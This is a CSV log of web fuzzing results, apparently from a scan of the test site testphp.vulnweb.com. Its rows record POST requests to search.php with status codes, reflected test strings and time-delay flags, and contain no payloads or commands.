id_fuzz,#,URL,Method,StatusCode,SearchKeyword,TimeDelay
id_fuzz_1,52,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,53,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,54,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,55,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,56,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,57,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,58,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,59,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,60,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,111111 is reflected test is reflected ,is delayed
id_fuzz_1,61,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,111111 is reflected test is reflected ,is delayed
id_fuzz_1,62,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,111111 is reflected test is reflected ,is delayed
id_fuzz_1,63,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,111111 is reflected test is reflected ,is delayed
id_fuzz_1,64,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,65,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,66,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,67,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,68,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,69,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,70,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,71,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,72,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,73,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,74,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,75,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,76,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
id_fuzz_1,77,http://testphp.vulnweb.com/search.php?test=query,POST,200 is present ,test is reflected ,is delayed
